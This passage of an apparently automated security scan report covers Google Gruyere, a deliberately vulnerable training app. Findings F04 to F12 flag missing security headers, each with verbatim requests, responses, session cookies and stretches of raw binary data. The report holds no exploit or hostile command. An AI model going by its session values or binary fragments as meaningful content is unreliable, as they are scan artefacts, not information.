    \x1f�\x08\x00\x00\x00\x00\x00\x02��T���0\x10��\x15\x03,�I�od�&�b�\x14A���HYD(R�h{\x0f���x��k�\x18\x10,\x0d�\oް2��ީg�K�-iڿ�1�`�ɵxxN��\x1d�g�\x17튆uR���GX�4�黕L��S��p��e`z(\x06ae�\x19�\x06�&J����Mv��YN�\x1c�\x02�\x12�
    5�F\x19[��z=��כ�� �u%��!'^\���꒔h�\x06��3���R��H���+���+c���3=�A��Q�ӃX��y܌4����1���䀸���˔oye���:|k��!��g��i-,NSQ�q�tw�B�\x0f�'\x08�mO�J�F���6\���\x0b2�\x063�~��z\x1bѩo�2��\x1eG�q�Ofg%��-\x0e9���:��	�&\x12b��|c\x01\x15��n��i^�եI Yd�^����2.w\x030��I�μ\x15�ͫ�$�"5\x14�1�a:Y]Z�y�\x0e�^�F�CIl���1���{$\x0b�#:P��\x13\2��.1�E�o0�ڬ\x14:��h�?\x1a�a��J'|c�؈1px�ss�R�\x03�40�$.�U�~�\x02�o>�k\x03>��LظmAӣ-R�d��\x7f;�5\x7f-�qs���Uv|\x12��\x1e�W=\x18C�|R\x0b��Ҝ\x03��\x02!8�\g�$�
    kq�7cp\x19u8�/�M��\��2'\x0d�\x1d�Xǌ�{9`8>��R׋E]�*X٘z7���֋�\x0c4��n\,��Jƭe%���C0w�g\�'H��4�8\x08 ��I�qY?�\x13��\x11\x01�'"\x1c$wmI�\x15�\x7f�7��a�#������z~����I'%���n\x00:���H\x05'�%�dL\x0b\x1a��T��/\x7f�_�\x16s_���>\x06<X��'��\x03\x00\x00��\x03\x00���J�\x06\x00\x00
  elapsed_ms: 42.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/static/codelab.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F04] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/ (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-7de3636b (exactly as issued by the engine) ---
  GET /
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 11506
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:54 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 52236ec8b41e6cea6eead67456d8c26f
  body:
    <HTML><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <TITLE>Web Application Exploits and Defenses</TITLE>
    <LINK type="text/css" rel="stylesheet" href="../static/codelab.css">
    <!--MARK-Z-->
    <SCRIPT>
    function toggleBlock(heading, whichID) {
      var image = heading.childNodes[0];
      var block = document.getElementById(whichID);
      if (block) {
        if (getDisplay(block) == 'block') {
          block.style.display = 'none';
          image.src = 'static/closed.gif';
    ... [76 more lines, 4000 chars total]
  elapsed_ms: 228.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/ as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F05] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/part1 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-34f82d0d (exactly as issued by the engine) ---
  GET /part1
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 13686
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:55 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: c0ef007f2960279c4e2714c35f753d98
  body:
    <HTML><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <TITLE>Web Application Exploits and Defenses</TITLE>
    <LINK type="text/css" rel="stylesheet" href="../static/codelab.css">
    <!--MARK-Z-->
    <SCRIPT>
    function toggleBlock(heading, whichID) {
      var image = heading.childNodes[0];
      var block = document.getElementById(whichID);
      if (block) {
        if (getDisplay(block) == 'block') {
          block.style.display = 'none';
          image.src = 'static/closed.gif';
    ... [76 more lines, 4000 chars total]
  elapsed_ms: 249.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/part1 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F06] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/part2 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ff073f37 (exactly as issued by the engine) ---
  GET /part2
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 37564
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:55 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 52db7c4ee835ffaf239341312b3f6853
  body:
    <HTML><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <TITLE>Web Application Exploits and Defenses</TITLE>
    <LINK type="text/css" rel="stylesheet" href="../static/codelab.css">
    <!--MARK-Z-->
    <SCRIPT>
    function toggleBlock(heading, whichID) {
      var image = heading.childNodes[0];
      var block = document.getElementById(whichID);
      if (block) {
        if (getDisplay(block) == 'block') {
          block.style.display = 'none';
          image.src = 'static/closed.gif';
    ... [76 more lines, 4000 chars total]
  elapsed_ms: 250.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/part2 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F07] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/part3 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-450871de (exactly as issued by the engine) ---
  GET /part3
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 29253
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:56 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: f033638fe2ebcb2abec48e3c6a91fb0e
  body:
    <HTML><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <TITLE>Web Application Exploits and Defenses</TITLE>
    <LINK type="text/css" rel="stylesheet" href="../static/codelab.css">
    <!--MARK-Z-->
    <SCRIPT>
    function toggleBlock(heading, whichID) {
      var image = heading.childNodes[0];
      var block = document.getElementById(whichID);
      if (block) {
        if (getDisplay(block) == 'block') {
          block.style.display = 'none';
          image.src = 'static/closed.gif';
    ... [76 more lines, 4000 chars total]
  elapsed_ms: 295.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/part3 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F08] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/part4 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-25f27391 (exactly as issued by the engine) ---
  GET /part4
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 24149
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:57 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 8998d0613a61ac52d8cc74f688917cdd
  body:
    <HTML><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <TITLE>Web Application Exploits and Defenses</TITLE>
    <LINK type="text/css" rel="stylesheet" href="../static/codelab.css">
    <!--MARK-Z-->
    <SCRIPT>
    function toggleBlock(heading, whichID) {
      var image = heading.childNodes[0];
      var block = document.getElementById(whichID);
      if (block) {
        if (getDisplay(block) == 'block') {
          block.style.display = 'none';
          image.src = 'static/closed.gif';
    ... [76 more lines, 4000 chars total]
  elapsed_ms: 245.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/part4 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F09] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/part5 (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-50c79e07 (exactly as issued by the engine) ---
  GET /part5
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 25303
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:57 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 03a5d2ef75b6aff01fe23e0749ded654
  body:
    <HTML><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <TITLE>Web Application Exploits and Defenses</TITLE>
    <LINK type="text/css" rel="stylesheet" href="../static/codelab.css">
    <!--MARK-Z-->
    <SCRIPT>
    function toggleBlock(heading, whichID) {
      var image = heading.childNodes[0];
      var block = document.getElementById(whichID);
      if (block) {
        if (getDisplay(block) == 'block') {
          block.style.display = 'none';
          image.src = 'static/closed.gif';
    ... [76 more lines, 4000 chars total]
  elapsed_ms: 300.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/part5 as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F10] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/static/gruyere.png (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e093691f (exactly as issued by the engine) ---
  GET /static/gruyere.png
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    age: 146
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: public, max-age=600
    content-length: 40079
    content-type: image/png
    date: Sat, 03 Oct 2026 01:30:32 GMT
    etag: "3m8CBg"
    expires: Sat, 03 Oct 2026 01:40:32 GMT
    server: Google Frontend
    x-cloud-trace-context: 13e8c9380ee77f881f1055a40a74d308
  body:
    �PNG\x0d
    \x1a
    \x00\x00\x00\x0dIHDR\x00\x00\x02�\x00\x00\x02Z\x08\x02\x00\x00\x00����\x00\x00\x00\x01sRGB\x00��\x1c�\x00\x00\x00\x04gAMA\x00\x00��\x0b�a\x05\x00\x00\x00 cHRM\x00\x00z&\x00\x00��\x00\x00�\x00\x00\x00��\x00\x00u0\x00\x00�`\x00\x00:�\x00\x00\x17p��Q<\x00\x00�\x0dIDATx^��i�\x15E����z>�u�ݵ���s�]����]mkw;S Ťض�\x00�(X�\x0e������ʰ\x01�
    \x10\x1c�\x11K\x05AeP\x19\x04,@�Ǣ(�
    ��
    ((�\x02d�'32sGfFfF���;�?+t��\x1d\x19\x19���x���\x13���\x1eO̿D��\x7f�}y��y�\x19�@\x00\x04@\x00\x04@\x00\x04@�d\x04Ν;w���S�\x1cI�{���	sg�x��N��\x0d\x12\x08�\x00\x08�\x00\x08�@$\x04nzlʤ坡�x\x16\x15�i��y�g�<5��\ee��1���{c��e�������N\x0e~\x17	\x04@\x00\x04@\x00\x04@ \x12\x02\x7f\x1e<��w(�6�E\x05h\x1a5�Ņ�H�<��ɿ>:^�&\x03\x07\x0e����tI��p
    \x08�\x00\x08�\x00\x08��<�x�\x10k%���ɤ	�9体��n'��%UUU#�R\x0e��N\x04��\x13�\x05KQT&@��*Og\x05�V\x14���QP�/\x13��YE�\x13���*_f���\x0b��E�'/��}'Y�AB\x0b(W�gj;>���\x1f:\x07\x19�]\x11�iФܲ�Pl����^���];�%���z�]V�ZzZ;.w��K\x18m�\x1f�l&]��\x05��̚4y��{��No��7@�)ٞG�B��˗��/��)\x7f-����D��Y��;+y>�����$�_yV���+�\x1d��v�^uf��cS�������\x1dg��[d�$�\x7f����\x1e<?mI�mS�kfԵ�W\x0c�4q�i͘J��R��(�����A�wukig�r[���\x0c���+�Sk��#�_��Z8+��o\Kp	/&�\x16�2��I��?�{މ����wG���9+9��Sᨿ;\x01�w'����S�3�����ON�o<����\x06N���7��6��#�\x1e�����r��s�: ˱]����O��mJ������܄%�������I\x13���ԙ�\x08v]����ZɵڢEx]�׮QC���q�&M�1��o\x1dG\x02\x01\x10\x00\x01\x10\x00�t\x13��׳����?v�3����6��͓��1���ڎY+;�_w��ŧط��;�[vz��ηלy��\x13� e�\x19��\x15����~���k��\x1b��Mm|곓sVu~��̈�\x1c��\x1f�͍��t(��E���\x0cZ���\x12}�$����je\���.\x1a�it���0NԤɈ�;�{�Gz��\x1d�I�j�2ǧ�T\x13Կ��\x03���\x18\x02�?��+�\��\x7f9p~�ׇo���n\x08h��\x05��\x1e�w��w\x0fn>tn��w�=AG^���=5\x07�^u�n\x7f�ාM��s��3�����C��Yu�֩���?��\x0f�=�[�\x06�=:e	}u�֙G���{'�4Ѿ�_\x7f�LSQ:��q͠�;�)�\x07>��q�GX����{�(V��g�D7����/N\x19�Ӥɓ���m�q$\x10\x00\x01\x10\x00\x01\x10H7\x01�\x0b��]��I\x0d�f�1����s��l���ֿ�l����u�ξ����std���w�9�ˁs3�\x1c�#O|�t��=Ӗ�X���͹�4C��;{>X{ꝟN����\,O\x7f����B�\x7f�'�����_���\x07�$�����;�)�\x07�,��,�S�<;�Q�����\x1a\x19��\x14Ml��I�'>=y���H \x00\x02 \x00\x02 �n\x02�l�Z����\x05k��_v���\x0cy;(\x08t��o|up��Fv�|$Ӿm��xn�M,3Y߹?�|����?��<��&t�Z����M$M�zw��u�\x16m>}����&�\x1f0a��S\x0f	IV������s��%;�]\x12e���^\x14�bI�|��<{�����=ˡ�Pl��M�&�\x7f|��r����\x00I��\x12d\x0bPy:�\x04\x15��\x04�/	*�l�\x1f\x11X�b�_\x12TD����__tlm:?�ff�n��>��f:��{\x0d��u,�~j��}t���\x17��\x1e4u\x1b}��\x7f���62\x04+�������Ψ\x7foձ\x05���x���\x13�\x0e����x�ѷv��E\x1be\x1e6g��ӏ�X��ߝ\x1b���%�\x7f�j�wۻ]\x12e�\x1b_��S����������%k�jQ�\x1e"������l��p�c���?=�t��A�&�}|���ީ��f-��\�'�l��G���Lm�yP\x7f��\x00�\x0e\x04�\x7f�\x7f��<�,��������~=���/\x1d/.���''�~s��\x1e��펚C\x0b\x7f�xwe��Hv��w���׶���q�+�/j�i���S7��q���w�iY��sM��A3��=�}���Y�\x0e�=���U'7\x1e8�q\x1d�r�ɤ��]9���|�\x7f_u߷ۻ\\x12e�����{⫋;,�X�(۽�ϻԢ�{8\x7f\x15�n3��GL���\x7fjȈ�'��h��яO\x0c�i�f�\x0d�.��I���U�J\x0eV%_g��.\x04|�\x0c�\x19��?X�ag��Ġ��9����L\|x�׭��o�}Fcϗ\x7f\x1e0��Mӏ�;}�����\x13�^�v�#t�nys��\x19;��\x1b;o���Tˌ\x1fO?[�N�:?7t��V�-5GozcS�q;n��r��=��m�q��>\x13�\x08��\x7f�=q��\x0e�Wd�]R!?G�?�R�2�|i�{Q���	���tl�*F��G\x04\x04Dw����g'�ZiҤ��\x137�h�H��n\x0c��\x0b���K��^5g�\x06�<�\x1a�w#\x00�^]\x0b�\x07�\x07�OTOA\x11�O�7[�Lh�zcO����\x13\x1b�O����r���f�'����Z�Oi\x1e0���\x16/�|憱[����k\���Y;���ӏ�8�(�<`�\x11�L�\x08[�\x1fwN|eQ��U\x11����o*��\x0ew�,I�T+y�\\���SC����.M>,\x1crl䴶\x01���O=�oʑ>���������^c�ˤ\x1b�nW�k�i�\x0d�m�a�dR\x0b�H2U\x15�A�]�\x18~��w*\x0f�����<2`\x1a=�J�񑦷\x0dГ�'it�M�n�qL\x19)�����Uyʌ�K��{\x04���\x02�'��g���\x0d����p��w�?���w�vR\x18l�ɇ���c���߿xp�\x1e}t*����;&���C0���?��Yԡ����g����\x1e|�ON\x18\x0dѤ�#\x1f��GR��������t��;�\x1b���\x11��xt���?�&�����)�:\x14S�|�)g1\x17���\x10�O݃:	u\x15�0�m�������\x1c\x1b0]>�dDH\x15(�L��S�"�\x15��\x7f\x14T��\x04\x7fyVAr������Gf|\x7f|��\x03&7�\x0b�y|���k��\x1e}���]�0\x15�\x02�Y��NU�\x14W\x08;�+����j��K�!����\x10\x1fҤ��c}'5�\x1c���'\x17�c�wK�������b\x1e	\x04�\x04Nvv/^���ܷW>���[UurL\x17���O�3|=T,���Pp���<�\x14�w#\x00�^�	�'u���R�<(Wq�D\x12\x04�鎉�#Q�\x04\x7f��	�+�\x14B�I�\x0d�Gks
    \x0f�&M�\x7fp�̆{�;�p��;����7?���o\x17)���⅋y{
    �T\x0b˷\x1c�/'��3\x0f�o\x10�dE\x19��S�`�շWP���C]�\x04��Zc��z��@�C�w�\x1f:R_\x05��/\�e�kM�}��\x1e���������¨?q \x1a�Q0�	\x05�\x1cuI��l�\x1a���V�c�7\x17T]�R�V�R��Qdy��C1%���~��۩�3��-���\x15�����fK��G�Mm��|�\x05G�O�\{>�P�5g	�w\x11�~�ӝ\x02\x7f�����8�����������o�}�4�O��G>^�n\x17�$o��3k\x04X\x0f�&ir��'K6R�Q�u�4���Lm�y\?ɇ�S��ߧ��_婥��O��w\x10��{\x14�?���\x19���cH�6�\x17�~S[�&6\�\x1f\x1e�-�>���K
    Ҥuk��*���_��^�\x08\x1d#��J�^1���s��Nt���|�B�'4莓��^�q��~������ʧ�8�\x7f.�\x0c��~f�5����M}hՏ�x*o���X8ǉ�A���YUa\x06�_t_�߻������\��\x1c\x7f�	�v��L!\x02��{�#�����w�����\x07�?T���)�>�UO_l�z�|$I\x14�R�ɏ��NŦ���4a����^��'�c���\x0d\x03���z}�7~�wΡ\x07�9:����>hwNm\x0f�����\x0e�{����ʑ+{��ѷw�����8N5��|������\x1b!r�����z�>�\x1f�~�	��\x0c��B�R^����kG��\x7f���\x17.�3'Mj\x1cս&_ߜo�)\x7fr_~ѭ�4��/�pq��HtI�e\x04.'M��*g�ε\x1d?y�ȏ�#Qw"UQ5q\x7f�\x17V��`��o�\x1a���:��b�/0����o�
    e���w\x04��	����\x143@Ť�x��R\x00,�K��ǿ�n�noi�U��/��[��\x17ܘ_0 �qB�iE~����&YSf�4�y���:?\��Ϗ\x7fy��;��y��Ԗ\x1e/�|���\x0f�\x7f�)U=��\x0fw��D\x1f�ڥ��+hA|1\x0fa�s[���S�j�OC\x02T�NA��"\x00�a�\x0cV\x0e�\x07�\x16�Y����	mG���W<4���o\x16�	�������\x1f\x1e�/\x19��㐛�yJ�\x7f$�ݑ��[��x~��NҤ~V�K�\x7f�f5��~�ӫלz�\x1f`�S�OP�ʗ�z�N�����7�a��ӝg鈥��>��|���\x0f��㥺��\x0f�u�=no��.҄D��=]��]����n�\x0eVS�\x01PE����W�,���Yf_W�U���Q\x7f\x19\��N�\x17\x1f�\x7fw\2\x1dҒ'��5i2��Vz�\x15����)\x02��_�]&\x05ir�\��D�ؖ��;
    !&?>�?\x7f&\x7f�b������$M�������Kz�٫\x1do�y��l�i?Wx$�8\x10I\x13�V\x01k"YaK���\x17��`\x15�{V}C�g�k7�����y˶��k\x1b\x0f\x1c�K
  elapsed_ms: 52.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/static/gruyere.png as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F11] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/start (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-c3b99fc7 (exactly as issued by the engine) ---
  GET /start
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 756
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:58 GMT
    server: Google Frontend
    x-cloud-trace-context: baff9e4a931ead826e9b7d2ae261c6c2
  body:
        <HTML>
        
      <STYLE>
      body, th, td, form {
        font-family: Verdana, Arial, Helvetica, sans-serif;
        font-size: 12px;
      }
      h1 { color: #dd0000; }
      </STYLE>
        <TITLE>Start Gruyere</TITLE>
        <BODY>
        <H1>Start Gruyere</H1>
    ... [11 more lines, 755 chars total]
  elapsed_ms: 235.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://google-gruyere.appspot.com/start as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GRUYERE F12] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://google-gruyere.appspot.com/code/ (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-9bebea82 (exactly as issued by the engine) ---
  GET /code/
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:32:59 GMT
    pragma: no-cache
    server: Google Frontend
    x-cloud-trace-context: 0c695e7dcd8c3c19def1a5162660bce8
  body:
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
       "https://www.w3.org/TR/html4/frameset.dtd">
    <HTML>
    <HEAD>
    <TITLE>Gruyere Code</TITLE>
    </HEAD>
    <FRAMESET cols="165,100%">
      <FRAME src="/static/codeindex.html">
      <FRAME name="codepage" src="">
      <NOFRAMES>
        <A href="/static/codeindex/html">Code Index</A>
      </NOFRAMES>
    ... [2 more lines, 353 chars total]
  elapsed_ms: 240.5
  --- RAW REQUEST req-6a8de6d7 (exactly as issued by the engine) ---
  GET /code/?gruyere.py=
  headers:
    Cookie: GRUYERE=100416652|1||author; GRUYERE_ID=530506698111053146050861906974275631884
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    alt-svc: h3=":443"; ma=2592000,h3-29=":443"; ma=2592000
    cache-control: no-cache
    content-length: 354
